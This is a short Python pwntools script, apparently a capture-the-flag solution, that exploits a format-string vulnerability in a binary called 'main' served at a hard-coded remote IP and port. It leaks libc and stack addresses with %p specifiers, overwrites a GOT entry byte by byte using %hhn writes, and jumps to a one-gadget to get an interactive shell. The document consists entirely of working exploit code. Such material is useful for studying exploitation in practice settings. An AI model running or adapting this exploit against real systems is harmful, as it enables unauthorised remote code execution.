from pwn import*
p = process('./main')
p = remote('49.235.243.206',10505)
libc =ELF('./libc-2.23.so')
payload = 'LIBC:%11$pStack:%8$p'
p.sendline(payload)
p.recvuntil('LIBC:')
libc_base = int(p.recv(14),16) - libc.sym['__libc_start_main'] - 240
log.info('LIBC:\t' + hex(libc_base))
p.recvuntil('Stack:')
target = int(p.recv(14),16)
log.info('TARGET:\t' + hex(target))
rce = libc_base + 0xF02A4
read = 0x601020
def modify(addr,data):
	p.sendline(addr)
	sleep(0.1)
	p.sendline(data)
	sleep(0.1)
modify('%' + str((target-8 + 2)&0xFF) + 'c%6$hhnFMYY','%' + str((read>>16)&0xFF) + 'c%8$hhnFMYY')
modify('%' + str((target-8 + 1)&0xFF) + 'c%6$hhnFMYY','%' + str((read>>8)&0xFF) + 'c%8$hhnFMYY')
modify('%' + str((target-8 + 0)&0xFF) + 'c%6$hhnFMYY','%' + str((read)&0xFF) + 'c%8$hhnFMYY')
p.sendline('%' + str(rce&0xFFFF) + 'c%9$hn\x00')
p.interactive()
